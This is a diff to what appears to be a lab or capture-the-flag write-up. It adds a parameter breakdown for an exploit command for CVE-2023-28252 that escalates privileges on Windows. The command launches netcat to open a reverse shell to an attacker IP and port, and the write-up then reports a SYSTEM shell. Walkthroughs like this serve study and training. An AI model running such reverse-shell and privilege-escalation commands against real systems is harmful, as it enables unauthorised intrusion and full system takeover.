@@ -104,6 +104,14 @@ After discovering the target is vulnerable to CVE-2023-28252, we locate a suitab
        .\ex.exe 1208 1 "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 443 -e cmd"
     ```
     {{< figure src="/ox-hugo/2024-11-04-194705_.png" >}}
+    - **Command breakdown**:
+        - `.\ex.exe`: The compiled exploit executable
+        - `1208`: Process ID to target
+        - `1`: Execution mode flag
+        - Netcat parameters:
+          - `10.10.14.121`: Attacker's IP address
+          - `443`: Port to connect back to
+          - `-e cmd`: Execute cmd.exe and bind it to the connection
 
 -   **Confirm Privilege Escalation**:
     Successfully receive NT/Authority SYSTEM shell:
